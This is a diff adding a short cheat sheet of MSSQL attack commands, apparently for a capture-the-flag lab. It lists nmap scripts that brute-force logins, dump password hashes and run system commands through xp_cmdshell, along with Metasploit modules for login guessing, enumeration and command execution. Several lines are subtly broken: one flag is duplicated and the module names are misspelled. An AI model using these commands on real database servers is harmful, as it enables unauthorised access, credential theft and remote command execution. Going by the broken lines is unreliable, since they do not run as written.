@@ -1,0 +1,14 @@
+nmap <ip> -p 1433 --script ms-sql-info
+nmap <ip> -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
+nmap <ip> -p 1433 --script ms-sql-brute --script-args userdb=/root/example/wordlist.txt,passdb=/root/example/wordlist.txt
+nmap <ip> -p 1433 --script ms-sql-empty-password
+nmap <ip> -p 1433 --script ms-sql-query --script-args mssql.username=example,mssql.password=example,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
+nmap <ip> -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=example,mssql.password=example
+nmap <ip> -p 1433 --script --script ms-sql-xp-cmdshell --script-args mssql.username=example,mssql.password=example,ms-sql-xp-cmdshell.cmd="ipconfig"
+nmap <ip> -p 1433 --script --script ms-sql-xp-cmdshell --script-args mssql.username=example,mssql.password=example,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
+
+use auxiliary/scanner/mssql/mmssql_login (make sure you setg hosts <ip> and set user_file and pass_file to your wordlists)
+use auxiliary/admin/mssql/mmssql_enum
+use auxiliary/admin/mssql/mmssql_enum_sql_logins
+use auxiliary/admin/mssql/mmssql_enum_exec (set cmd to 'whoami')
+use auxiliary/admin/mssql/mmssql_enum_domain_accounts
